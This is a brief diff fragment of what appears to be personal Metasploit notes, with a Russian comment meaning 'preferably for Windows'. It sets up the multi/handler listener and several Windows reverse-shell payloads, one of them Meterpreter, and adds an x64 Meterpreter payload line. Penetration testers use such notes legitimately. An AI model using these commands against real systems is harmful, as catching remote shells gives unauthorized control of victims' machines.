@@ -27,7 +27,7 @@ run
 use exploit/multi/handler
 
 set payload windows/meterpreter/reverse_tcp
-
+set payload windows/x64/meterpreter_reverse_tcp
 
 желательно для виндовс
 set PAYLOAD windows/x64/shell_reverse_tcp
